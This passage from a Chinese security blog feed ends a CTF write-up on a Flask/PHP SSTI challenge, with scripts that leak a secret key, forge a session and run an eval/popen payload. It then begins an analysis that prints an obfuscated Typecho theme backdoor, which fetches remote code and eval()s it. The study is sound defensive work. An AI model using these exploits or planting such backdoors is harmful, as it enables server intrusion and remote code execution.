class="hljs-number">0</span>],FILE_APPEND);<br>   <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>,<span class="hljs-string">&quot;-&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-variable">$tmp_code</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>);<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$tmp_code</span>;<br>   <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>,<span class="hljs-variable">$code</span>[(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$code</span>,<span class="hljs-variable">$tmp_code</span>)+<span class="hljs-number">1</span>)%<span class="hljs-number">17</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><a href="http://leak.py">leak.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#leak.py</span><br>url=<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span><br>code=<span class="hljs-string">&quot;-0123456789abcdef&quot;</span><br>f=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>   cut = (<span class="hljs-number">11</span>-x)*<span class="hljs-string">&#x27;-config.JSON_SORT_KEYS&#x27;</span><br>   leak_temp = <span class="hljs-string">&quot;&#123;&#123;config.SECRET_KEY[config.JSONIFY_MIMETYPE.index(config.APPLICATION_ROOT)&quot;</span>+cut+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>   <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> code:<br>       text=requests.get(url,params=&#123;<span class="hljs-string">&quot;username&quot;</span>:leak_temp&#125;).text<br>       <span class="hljs-comment">#print(text)</span><br>       <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&gt;404&lt;&quot;</span> <span class="hljs-keyword">in</span> text:<br>           <span class="hljs-keyword">pass</span><br>       <span class="hljs-keyword">else</span>:<br>           requests.get(url,params=&#123;<span class="hljs-string">&quot;username&quot;</span>:y+<span class="hljs-string">&quot;code&quot;</span>&#125;)<br>           f+=y<br>           <span class="hljs-built_in">print</span>(f)<br>           <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>然后在php的shell里kill掉php服务，之后退出shell；再在java的shell里kill掉java进程。再把上面的leak.php写入到tmp下，把leak.py写到vps的目录下。</p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319205729662.png" alt></p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319205904127.png" alt></p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210107587.png" alt></p><p><a href="http://xn--vpsleak-iw3kp19dkqpgy7dou2admru7x.py">在自己的vps上运行leak.py</a>：</p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210415208.png" alt></p><p>然后利用爆破出的key伪造session：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&quot;8a8cf74c-0d2&quot;</span><br><br>session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>   a=&#123;<span class="hljs-string">&quot;cs&quot;</span>:<span class="hljs-string">&quot;__class__&quot;</span>,<span class="hljs-string">&quot;bs&quot;</span>:<span class="hljs-string">&quot;__base__&quot;</span>,<span class="hljs-string">&quot;sub&quot;</span>:<span class="hljs-string">&quot;__subclasses__&quot;</span>,<span class="hljs-string">&quot;num&quot;</span>:<span class="hljs-number">190</span>,<span class="hljs-string">&quot;it&quot;</span>:<span class="hljs-string">&quot;__init__&quot;</span>,<span class="hljs-string">&quot;gb&quot;</span>:<span class="hljs-string">&quot;__globals__&quot;</span>,<span class="hljs-string">&quot;bt&quot;</span>:<span class="hljs-string">&quot;__builtins__&quot;</span>,<span class="hljs-string">&quot;el&quot;</span>:<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /python_flag &gt; /tmp/python_flag&#x27;).read()&quot;</span>&#125;<br>   <span class="hljs-built_in">print</span>(session_serializer.dumps(a))<br><br>index()<br></code></pre></td></tr></table></figure><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210612610.png" alt></p><p>构造python模板的poc：</p><p><code>&#123;&#123;(cycler[session.cs]|attr(session.bs))[session.sub]()[session.num][session.it][session.gb][session.bt][session.el](session.cmd)&#125;&#125;</code></p><p>在header头里添加cookie字段伪造得到的session，发送数据包即可在tmp目录下找到python_flag：</p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210848354.png" alt></p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210800207.png" alt></p><h2 id="0x05-Getflag">0x05 Getflag</h2><p>三段拼接即可得到flag，提交完事：</p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319211051166.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某模版可疑函数的分析记录</title>
    <link href="/2021/12/14/%E6%9F%90%E6%A8%A1%E7%89%88%E5%8F%AF%E7%96%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/12/14/%E6%9F%90%E6%A8%A1%E7%89%88%E5%8F%AF%E7%96%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言">0x00 前言</h2><p>最近逛安全论坛，发现有人求分析某博客模版的可疑函数，杀软和在线沙盒少数报毒。 秉着乐于助人的想法分析一下。</p><h2 id="0x01-初步分析">0x01 初步分析</h2><p>模版是typecho的模版，主要目录结构如下：</p><p><img src="/2021/12/14/%E6%9F%90%E6%A8%A1%E7%89%88%E5%8F%AF%E7%96%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20211214190420643.png" alt></p><p>据帖子里的信息，可疑函数存在于<code>include/encryption.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">WGkpJSCm</span>(<span class="hljs-params"><span class="hljs-variable">$tH0AEmD4kkF5c11h</span>, <span class="hljs-variable">$cerRRj1M</span>, <span class="hljs-variable">$ASQN6QRMNzFQ5</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>), <span class="hljs-variable">$tnpYw1ZNFHsSS0</span> = <span class="hljs-number">5</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$version</span> = <span class="hljs-title class_">Helper</span>::<span class="hljs-title function_ invoke__">instance</span>()-&gt;<span class="hljs-title function_ invoke__">getVersion</span>();<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title class_">Cache</span>::<span class="hljs-title function_ invoke__">get_cache</span>(<span class="hljs-variable">$version</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$content</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-variable">$GUEvoe</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br>    <span class="hljs-variable">$w8NJy6B</span> = <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">3</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">6</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">33</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">22</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">36</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">32</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">35</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">30</span>];<br>    <span class="hljs-variable">$tZimtcjkPF5YT</span> = <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">31</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">10</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">10</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">16</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">3</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">18</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">12</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">23</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">19</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">18</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">24</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">20</span>];<br>    <span class="hljs-variable">$hbKrTbzEdZPpY</span> = <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">32</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">18</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">24</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">23</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">12</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">0</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">12</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">10</span>];<br>    <span class="hljs-variable">$yteEDZ2N128rP</span> = <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">32</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">18</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">24</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">23</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">33</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">10</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">35</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">16</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">10</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">6</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">24</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">24</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">6</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">20</span>];<br>    <span class="hljs-variable">$CayZHRZ0AhSWy</span> = <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">32</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">18</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">24</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">23</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">17</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$GUEvoe</span>[<span class="hljs-number">32</span>];<br>    <span class="hljs-variable">$ASQN6QRMNzFQ5</span>[<span class="hljs-variable">$w8NJy6B</span>(<span class="hljs-string">&#x27;Q29udGVudC1UeXBl&#x27;</span>)] = <span class="hljs-variable">$w8NJy6B</span>(<span class="hljs-string">&#x27;YXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04&#x27;</span>);<br>    <span class="hljs-variable">$bh1nXQfnD1HEd</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-number">13</span> =&gt; <span class="hljs-variable">$tnpYw1ZNFHsSS0</span>,<br>        <span class="hljs-number">19913</span> =&gt; <span class="hljs-number">1</span>,<br>        <span class="hljs-number">64</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-number">81</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-number">10023</span> =&gt; <span class="hljs-variable">$ASQN6QRMNzFQ5</span><br>    );<br>    <span class="hljs-variable">$bh1nXQfnD1HEd</span>[<span class="hljs-number">10002</span>] = <span class="hljs-variable">$tH0AEmD4kkF5c11h</span> . <span class="hljs-string">&#x27;?&#x27;</span> . <span class="hljs-variable">$tZimtcjkPF5YT</span>(<span class="hljs-variable">$cerRRj1M</span>);<br>    <span class="hljs-variable">$Kxjab8eCwAXZk</span> = <span class="hljs-variable">$hbKrTbzEdZPpY</span>();<br>    <span class="hljs-variable">$yteEDZ2N128rP</span>(<span class="hljs-variable">$Kxjab8eCwAXZk</span>, <span class="hljs-variable">$bh1nXQfnD1HEd</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$CayZHRZ0AhSWy</span>(<span class="hljs-variable">$Kxjab8eCwAXZk</span>);<br>    <span class="hljs-title class_">Cache</span>::<span class="hljs-title function_ invoke__">put_cache</span>(<span class="hljs-variable">$version</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到函数经过了混淆，确实比较可疑。对<code>$GUEvoe</code>这个变量进行url解码，得到字符串<code>n1zb/ma5\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37j</code>。以该字符串为关键词在搜索引擎上搜索，想了解下有没有类似的后门，发现只有用该字符串作php代码混淆器的结果。</p><p>那只能老老实实分析了。我们要知道的就是被混淆变量分别代表什么含义，函数大概实现了一个什么样的功能。做起来也比较简单，只需要虚拟机里搭建php环境，把这个php文件的可疑变量挨个输出就能得到真正含义了：</p><p><img src="/2021/12/14/%E6%9F%90%E6%A8%A1%E7%89%88%E5%8F%AF%E7%96%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20211214192108071.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ASQN6QRMNzFQ5</span>[<span class="hljs-variable">$w8NJy6B</span>(<span class="hljs-string">&#x27;Q29udGVudC1UeXBl&#x27;</span>)] = <span class="hljs-variable">$w8NJy6B</span>(<span class="hljs-string">&#x27;YXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04&#x27;</span>);<br>   <span class="hljs-variable">$bh1nXQfnD1HEd</span> = <span class="hljs-keyword">array</span>(<br>       <span class="hljs-number">13</span> =&gt; <span class="hljs-variable">$tnpYw1ZNFHsSS0</span>,<br>       <span class="hljs-number">19913</span> =&gt; <span class="hljs-number">1</span>,<br>       <span class="hljs-number">64</span> =&gt; <span class="hljs-literal">false</span>,<br>       <span class="hljs-number">81</span> =&gt; <span class="hljs-literal">false</span>,<br>       <span class="hljs-number">10023</span> =&gt; <span class="hljs-variable">$ASQN6QRMNzFQ5</span><br>   );<br>   <span class="hljs-variable">$bh1nXQfnD1HEd</span>[<span class="hljs-number">10002</span>] = <span class="hljs-variable">$tH0AEmD4kkF5c11h</span> . <span class="hljs-string">&#x27;?&#x27;</span> . <span class="hljs-variable">$tZimtcjkPF5YT</span>(<span class="hljs-variable">$cerRRj1M</span>);<br></code></pre></td></tr></table></figure><p><code>$w8NJy6B</code>对应<code>base64_decode</code>，<code>$tZimtcjkPF5YT</code>对应<code>http_build_query</code>，<code>$hbKrTbzEdZPpY</code>对应<code>curl_init</code>，<code>$yteEDZ2N128rP</code>对应<code>curl_setopt_array</code>，<code>$CayZHRZ0AhSWy</code>对应<code>curl_exec</code>。</p><p>看到<code>curl_exec</code>感觉有点危险，不过还是接着向下看。</p><p>通过分析，<code>$ASQN6QRMNzFQ5</code>是一个传入的数组，调用了<code>$w8NJy6B</code>也就是<code>base64_decode</code>函数，把数组<code>Content-Type</code>赋值成<code>application/json;charset=UTF-8</code>，估计是要传输json类数据。</p><p>之后<code>$bh1nXQfnD1HEd</code>进行了一系列操作：首先建立了一个数组，建立了5个键值对（作用未知），之后把10002项赋值成传进来的<code>$tH0AEmD4kkF5c11h</code>与<code>http_build_query</code>的拼接字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Kxjab8eCwAXZk</span> = <span class="hljs-variable">$hbKrTbzEdZPpY</span>();<br><span class="hljs-variable">$yteEDZ2N128rP</span>(<span class="hljs-variable">$Kxjab8eCwAXZk</span>, <span class="hljs-variable">$bh1nXQfnD1HEd</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$CayZHRZ0AhSWy</span>(<span class="hljs-variable">$Kxjab8eCwAXZk</span>);<br><span class="hljs-title class_">Cache</span>::<span class="hljs-title function_ invoke__">put_cache</span>(<span class="hljs-variable">$version</span>, <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p><code>$Kxjab8eCwAXZk</code>new了一个<code>curl_init</code>函数，下面就是通过<code>curl_setopt_array</code>来设置传输<code>$bh1nXQfnD1HEd</code>的信息。最后就是通过<code>$content</code>执行curl句柄<code>$Kxjab8eCwAXZk</code>。</p><h2 id="0x02-深入">0x02 深入</h2><p>虽然encryption.php看起来没有什么过于危险的行为，但还是让人在意请求了什么内容。这就需要从其他文件里找有哪些文件包含了encryption.php的函数。通过notepad++的搜索功能搜索工程目录，发现functions.php引用了可疑函数：</p><p><img src="/2021/12/14/%E6%9F%90%E6%A8%A1%E7%89%88%E5%8F%AF%E7%96%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20211214204227015.png" alt></p><p>发现function.php里的主题配置函数调用了该函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">themeConfig</span>(<span class="hljs-params"><span class="hljs-variable">$form</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;include/constant.php&#x27;</span>;<br>    <span class="hljs-variable">$D6xP3axeDW84i</span> = <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">3</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">6</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">33</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">22</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">36</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">32</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">35</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">30</span>];<br>    <span class="hljs-variable">$naRFbj6GT8jKd</span> = <span class="hljs-title function_ invoke__">WGkpJSCm</span>(<span class="hljs-variable">$D6xP3axeDW84i</span>(<span class="hljs-variable">$D6xP3axeDW84i</span>(<span class="hljs-string">&#x27;YUhSMGNITTZMeTlpYkc5bkxURXlOVEkwTVRBd09UWXVZMjl6TG1Gd0xXNWhibXBwYm1jdWJYbHhZMnh2ZFdRdVkyOXRMMlp5WldWM2FXNWtMM1psY25OcGIyNHZNVjh6TDNObGRIUnBibWN1Y0dodw==&#x27;</span>)), []);<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$pUOGCn</span>(<span class="hljs-variable">$naRFbj6GT8jKd</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到又包含了另一个文件constant.php，发现变量又被混淆了。我这里直接把混淆前的字符串标注在代码中了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FcVMmn1209&#x27;</span>, <span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$mqzdIP</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqcUhoVmd3U3B4WkZLSXNHbWRUTnV2YkFZWEJsemtFVU9vZVdRSnlpdExQTW5hZkNyY2pSRA==&quot;</span>);<br><span class="hljs-comment">//base</span><br><span class="hljs-variable">$TONFlS</span> = <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">3</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">6</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">33</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">30</span>];<br><span class="hljs-comment">//strtr</span><br><span class="hljs-variable">$vHMMaR</span> = <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">33</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">10</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">24</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">10</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">24</span>];<br><span class="hljs-comment">//substr</span><br><span class="hljs-variable">$HRyzqU</span> = <span class="hljs-variable">$vHMMaR</span>[<span class="hljs-number">0</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">18</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">3</span>] . <span class="hljs-variable">$vHMMaR</span>[<span class="hljs-number">0</span>] . <span class="hljs-variable">$vHMMaR</span>[<span class="hljs-number">1</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">24</span>];<br><span class="hljs-comment">//52</span><br><span class="hljs-variable">$nwLggz</span> = <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">7</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">13</span>];<br><span class="hljs-comment">//64_decode</span><br><br><span class="hljs-variable">$TONFlS</span> .= <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">22</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">36</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">29</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">30</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">32</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">35</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">26</span>] . <span class="hljs-variable">$mqzdIP</span>[<span class="hljs-number">30</span>];<br><br><span class="hljs-comment">// 更新内容</span><br><span class="hljs-variable">$tYBGeu</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqaVJQd0lkcVNhbWdwTmtsVHN5Vm9NclFYeHpIZkpoYmpPQkdlV25BTGN1WkVDRFlVS3RGdg==&quot;</span>);<br><br><span class="hljs-comment">//base</span><br><span class="hljs-variable">$pUOGCn</span> = <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">3</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">6</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">33</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">30</span>];<br><span class="hljs-comment">//strtr</span><br><span class="hljs-variable">$VFezNp</span> = <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">33</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">10</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">24</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">10</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">24</span>];<br><span class="hljs-comment">//substr</span><br><span class="hljs-variable">$YuLeHh</span> = <span class="hljs-variable">$VFezNp</span>[<span class="hljs-number">0</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">18</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">3</span>] . <span class="hljs-variable">$VFezNp</span>[<span class="hljs-number">0</span>] . <span class="hljs-variable">$VFezNp</span>[<span class="hljs-number">1</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">24</span>];<br><span class="hljs-comment">//52</span><br><span class="hljs-variable">$rOucYP</span> = <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">7</span>] . <span class="hljs-variable">$tYBGeu</span>[<span class="hljs-number">13</span>];<br><span 